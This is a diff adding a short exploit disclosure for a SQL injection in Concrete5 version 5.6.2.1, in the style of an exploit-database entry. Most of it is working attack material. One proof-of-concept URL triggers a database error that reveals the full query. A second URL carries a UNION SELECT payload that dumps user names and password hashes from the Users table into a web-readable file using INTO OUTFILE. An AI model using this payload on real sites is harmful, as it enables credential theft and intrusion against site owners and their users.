@@ -1,0 +1,21 @@
+# Exploit Title: Concrete5 sql injection
+# Date: 18/02/2014
+# Exploit Author: killall-9@mail.com
+# Vendor Homepage: https://www.concrete5.org/
+# Software Link: http://www.concrete5.org/download_file/-/view/58379/8497/
+# Version: 5.6.2.1 (stable)
+# Tested on: Virtualbox debian
+URL as a poc:
+http://localhost/concrete5.6.2.1/index.php/?arHandle=Main&bID=34&btask=passthru&ccm_token=1392630914:be0d09755f653afb162d041a33f5feae&cID[$owmz]=1&method=submit_form
+will produce:
+
+An unexpected error occurred.
+mysqlt error: [1054: Unknown column 'Array' in 'where clause'] in EXECUTE("select Pages.cID, Pages.pkgID, Pages.cPointerID, Pages.cPointerExternalLink, Pages.cIsActive, Pages.cIsSystemPage, Pages.cPointerExternalLinkNewWindow, Pages.cFilename, Collections.cDateAdded, Pages.cDisplayOrder, Collections.cDateModified, cInheritPermissionsFromCID, cInheritPermissionsFrom, cOverrideTemplatePermissions, cCheckedOutUID, cIsTemplate, uID, cPath, cParentID, cChildren, cCacheFullPageContent, cCacheFullPageContentOverrideLifetime, cCacheFullPageContentLifetimeCustom from Pages inner join Collections on Pages.cID = Collections.cID left join PagePaths on (Pages.cID = PagePaths.cID and PagePaths.ppIsCanonical = 1) where Pages.cID = Array")
+
+We can exploit the parameters Pages.cID in order to do some hackz:
+
+another URL as a poc:
+
+http://localhost/concrete5.6.2.1/index.php/?arHandle=Main&bID=34&btask=passthru&ccm_token=1392630914:be0d09755f653afb162d041a33f5feae&cID=1 union select uName,uPassword,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from Users into outfile '/var/www/concrete5.6.2.1/ownz.txt'&method=submit_form
+
+byez
